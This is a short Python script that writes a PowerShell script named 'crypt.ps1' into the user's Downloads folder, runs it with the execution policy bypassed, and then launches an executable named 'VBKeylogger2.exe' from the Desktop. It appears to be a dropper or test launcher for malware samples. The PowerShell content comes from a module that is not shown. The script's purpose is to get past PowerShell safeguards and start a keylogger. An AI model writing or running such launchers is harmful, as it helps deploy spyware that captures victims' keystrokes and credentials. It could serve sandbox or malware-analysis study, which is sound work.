from subprocess import Popen
from os import getenv, path
from script_constants_python import script_constants


def write_file(path: str, content: str):
    with open(path, "w+") as f:
        f.write(content)

def run_command(command: list):
    Popen(command)

def run_powershell_command(script_path: str):
    command = [
        "powershell", 
        "-ExecutionPolicy", 
        "Bypass", 
        "-Command", 
        f"\"& '{script_path}'\""
    ]
    run_command(command)

def main():
    user_profile_path = getenv("UserProfile")
    script_path = path.join(user_profile_path, "Downloads", "crypt.ps1")
    write_file(script_path, script_constants.crypt_script)
    run_powershell_command(script_path)
    sample_path = path.join(user_profile_path, "Desktop", "VBKeylogger2.exe")
    run_command(sample_path)

if __name__ == "__main__":
    main()
